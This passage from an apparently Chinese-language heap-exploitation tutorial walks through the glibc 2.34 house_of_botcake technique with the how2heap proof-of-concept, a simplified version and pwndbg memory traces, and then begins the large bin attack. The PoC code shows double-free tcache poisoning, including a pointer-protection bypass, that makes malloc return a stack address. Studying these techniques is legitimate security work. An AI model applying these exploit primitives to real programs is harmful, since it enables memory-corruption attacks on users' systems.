class="comment">//设置inuse位为1。因为tcache bin中的inuse位都是1，并没有经过修改</span></span><br><span class="line">			set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">			<span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">				set_non_main_arena (tc_victim);</span><br><span class="line">			<span class="comment">//把BK设置成small bin的链表尾。</span></span><br><span class="line">			<span class="comment">//原本他是倒数第二个，现在链表尾的chunk被取走放入tcache了</span></span><br><span class="line">			bin-&gt;bk = bck;</span><br><span class="line">			bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">			tcache_put (tc_victim, tc_idx);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后再看下tcache bin，链表头已经存入fake_chunk。这时候再malloc就会将fake_chunk取出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">                  top: 0x555555757940 (size : 0x206c0) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x090)  smallbin[ 7]: 0x5555557573b0 (invaild memory)</span><br><span class="line">(0x90)   tcache_entry[7](7): 0x7fffffffda60 --&gt; 0x5555557573c0 --&gt; 0x555555757690 --&gt; 0x555555757600 --&gt; 0x555555757570 --&gt; 0x5555557574e0 --&gt; 0x555555757450</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">                  top: 0x555555757940 (size : 0x206c0) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x090)  smallbin[7]: 0x5555557573b0 (invaild memory)</span><br><span class="line">(0x90)   tcache_entry[7](6): 0x5555557573c0 --&gt; 0x555555757690 --&gt; 0x555555757600 --&gt; 0x555555757570 --&gt; 0x5555557574e0 --&gt; 0x555555757450</span><br></pre></td></tr></table></figure></p>
<h2 id="house-of-botcake-glibc2-34"><a href="#house-of-botcake-glibc2-34" class="headerlink" title="house_of_botcake_glibc2.34"></a>house_of_botcake_glibc2.34</h2><h3 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h3><p>House of botcake的原理很简单。令 chunk存在于两个bin中，即double free。利用overlap chunk可以修改tcache bin中double free chunk的fd指针，这样再次申请malloc的时候就会申请到目标地址。</p>
<h3 id="POC-7"><a href="#POC-7" class="headerlink" title="POC"></a>POC</h3><p>how2heap源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This file demonstrates a powerful tcache poisoning attack by tricking malloc into"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"returning a pointer to an arbitrary location (in this demo, the stack)."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This attack only relies on double free.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The address we want malloc() to return, namely,"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"the target address is %p.\n\n"</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Preparing heap layout"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later."</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Allocating a chunk for later consolidation: prev @ %p\n"</span>, prev);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Allocating the victim chunk: a @ %p\n"</span>, a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating a padding to prevent consolidation.\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now we are able to cause chunk overlapping"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 1: fill up tcache list"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 2: free the victim chunk so it will be added to unsorted bin"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 3: free the previous chunk and make it consolidate with the victim chunk."</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now we have the chunk overlapping primitive:"</span>);</span><br><span class="line">    <span class="keyword">int</span> prev_size = prev[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="keyword">int</span> a_size = a[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"prev @ %p, size: %#x, end @ %p\n"</span>, prev, prev_size, (<span class="keyword">void</span> *)prev+prev_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"victim @ %p, size: %#x, end @ %p\n"</span>, a, a_size, (<span class="keyword">void</span> *)a+a_size);</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">    prev[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>)] = <span class="number">0x41414141</span>;</span><br><span class="line">    assert(a[<span class="number">0</span>] == <span class="number">0x41414141</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>简化版本<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">size_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) x[i] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//padding chunk or will double free</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(x[i]);</span><br><span class="line">    <span class="built_in">free</span>(a);  <span class="comment">// a in unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);  <span class="comment">// a in tcache</span></span><br><span class="line">    <span class="keyword">size_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0xb0</span>);</span><br><span class="line">    b[<span class="number">0x90</span>/<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = (<span class="keyword">size_t</span>)((<span class="keyword">long</span>)stack_var ^ ((<span class="keyword">long</span>)a &gt;&gt; <span class="number">12</span>));<span class="comment">// poison tcache</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    assert(c == stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="pwndbg调试-5"><a href="#pwndbg调试-5" class="headerlink" title="pwndbg调试"></a>pwndbg调试</h3><p>老开头，fake_chunk和tcache填充。<br>再申请两个0x80大小的chunk，a和prev。这两个chunk将会成为overlap chunk。a将会double free。<br>0x10的chunk用于防止a与top chunk合并。<br>【注：free的时候，如果chunk与top chunk物理相邻，该chunk就会并入top chunk。所以会设计一个padding chunk作为分隔，防止并入top chunk】<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">	consolidate into top</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">    check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>接下来free掉a和prev。a在free之后会进入unsorted bin。再次<code>free(prev)</code>的时候，就会触发consolidate forward，与物理相邻的高地址chunk a进行合并。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/botcake_consolidate.png" alt><br>堆的布局变化：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p prev</span><br><span class="line"><span class="meta">$</span>1 = (size_t *) 0x555555757690</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/32gx 0x555555757680</span><br><span class="line">0x555555757680: 0x0000000000000000      0x0000000000000091(chunk prev)</span><br><span class="line">0x555555757690: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557576a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557576b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557576c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557576d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557576e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557576f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757700: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757710: 0x0000000000000000      0x0000000000000091(chunk a)</span><br><span class="line">0x555555757720: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757730: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757740: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757750: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757760: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757770: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span> n</span><br><span class="line"><span class="meta">pwndbg&gt;</span> n</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/32gx 0x555555757680</span><br><span class="line">0x555555757680: 0x0000000000000000      0x0000000000000121(prev consolidate a)</span><br><span class="line">0x555555757690: 0x00007ffff7dbecc0      0x00007ffff7dbecc0</span><br><span class="line">0x5555557576a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557576b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557576c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557576d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557576e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557576f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757700: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757710: 0x0000000000000000      0x0000000000000091(chunk a)</span><br><span class="line">0x555555757720: 0x00007ffff7dbecc0      0x00007ffff7dbecc0</span><br><span class="line">0x555555757730: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757740: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757750: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757760: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757770: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>这时候从tcache bin中申请一个0x80大小的chunk，让tcache空出一个位置。再<code>free(a)</code>（double free）的时候chunk a就会进入tcache bin链的头部。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> bins</span><br><span class="line">                  top: 0x5555557577c0 (size : 0x20840) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x555555757680 (size : 0x120)</span><br><span class="line">(0x90)   tcache_entry[7](6): 0x555555757570 --&gt; 0x5555557574e0 --&gt; 0x555555757450 --&gt; 0x5555557573c0 --&gt; 0x555555757330 --&gt; 0x5555557572a0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> n</span><br><span class="line"><span class="meta">pwndbg&gt;</span> bins</span><br><span class="line">                  top: 0x5555557577c0 (size : 0x20840) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x555555757680 (overlap chunk with 0x555555757710(freed) )</span><br><span class="line">(0x90)   tcache_entry[7](7): 0x555555757720 --&gt; 0x555555757570 --&gt; 0x5555557574e0 --&gt; 0x555555757450 --&gt; 0x5555557573c0 --&gt; 0x555555757330 --&gt; 0x5555557572a0</span><br></pre></td></tr></table></figure></p>
<p>此时的堆内存布局：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> x/32gx 0x555555757680</span><br><span class="line">0x555555757680: 0x0000000000000000      0x0000000000000121</span><br><span class="line">0x555555757690: 0x00007ffff7dbecc0      0x00007ffff7dbecc0</span><br><span class="line">0x5555557576a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557576b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557576c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557576d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557576e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557576f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757700: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757710: 0x0000000000000000      0x0000000000000091</span><br><span class="line">0x555555757720: 0x0000555000202227      0x0853b65edf729b6c</span><br><span class="line">0x555555757730: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757740: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757750: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757760: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757770: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>下面一步是关键的修改chunk a的fd指针。<br>由于chunk prev已经overlap了chunk a，这时候申请一个合适大小（可以在unsorted bin中进行切割获取）的chunk b，通过操作chunk b的地址来修改chunk a的fd指针为fake_chunk的地址（&amp;stack_var）。注意PTR_PROTECT地址保护。前面的文章有写到。<br>其实申不申请都一样，只要可以修改chunk a就可以。也就是下面这条语句的效果是一样的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prev[<span class="number">18</span>] = (<span class="keyword">size_t</span>)((<span class="keyword">long</span>)stack_var ^ ((<span class="keyword">long</span>)a &gt;&gt; <span class="number">12</span>));</span><br></pre></td></tr></table></figure></p>
<p>这样就把stack_var也“链入”了tcache bin。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> bins</span><br><span class="line">                  top: 0x5555557577c0 (size : 0x20840) </span><br><span class="line">       last_remainder: 0x555555757740 (size : 0x60) </span><br><span class="line">            unsortbin: 0x555555757740 (overlap chunk with 0x555555757710(freed) )</span><br><span class="line">(0x90)   tcache_entry[7](7): 0x555555757720 --&gt; 0x7fffffffdaa0 --&gt; 0xfffffff800000002 (unaligned tcache chunk)</span><br></pre></td></tr></table></figure></p>
<p>malloc出chunk a之后，tcache bin链表头变成stack_var。再次malloc就能申请到target_addr，即stack_var。</p>
<h2 id="large-bin-attack-glibc2-34"><a href="#large-bin-attack-glibc2-34" class="headerlink" title="large_bin_attack_glibc2.34"></a>large_bin_attack_glibc2.34</h2><h3 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h3><p>看一下largebin nextsize的分布：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/largebin_nextsize.png" alt><br>在 malloc 的时候，遍历 unsorted bin 时会将遍历过的又不是恰好大小 size 的 chunk 填入对应 small bin或者 large bin 。插入large bin的时候，fd_nextsize是指向 size 变小的方向。同时，更改 fd_nextsize 和 bk_nextsize 指针内容。我们的攻击就是在修改 nextsize 链时完成的。<br>victim chunk 链入large bin 的时候，遍历链表，找到合适的位置插入。将victim的fd_nextsize指针指向双向链表的第一个节点即最大的chunk，bk_nextsize指向比它大的chunk。后面调试的时候细说。</p>
<h3 id="POC-8"><a href="#POC-8" class="headerlink" title="POC"></a>POC</h3><p>how2heap源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">		fwd = bck;</span></span><br><span class="line"><span class="comment">		bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Check 1 : \n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Check 2 : \n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;    if (bck-&gt;fd != fwd)\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n"</span>);</span><br><span class="line">  <span 